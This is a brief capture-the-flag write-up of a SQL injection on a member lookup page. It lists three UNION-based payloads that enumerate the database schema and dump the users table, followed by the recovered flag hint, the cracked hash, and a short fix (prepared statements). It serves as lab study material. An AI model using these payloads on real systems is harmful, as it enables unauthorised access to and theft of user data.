# SQL injection

# Where

```
<ip>/?page=member
```

## How

Typing anything other than an id returns an SQL error. This gives an indication that the input is not sterilized before running a query.

To get table names:
```
-1 union select null, concat (table_name) from information_schema.tables where table_schema = database ()
```

To get user table column names:
```
-1 union select null, concat (column_name) from information_schema.columns where table_schema = database ()
```

To get all data of users:
```
-1 union select NULL, concat (user_id, first_name, last_name, town, country, planet, Commentaire, countersign) from users
```

The last injection reveals this:
```
Surname : 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
```

With these instructions getting the flag was easy.
1. Decript the hash. -> FortyTwo
2. Encrypt the lowercase phrase with Sh256 -> fortytwo

## How to protect against

Use prepared statements or strerilize the input from the form.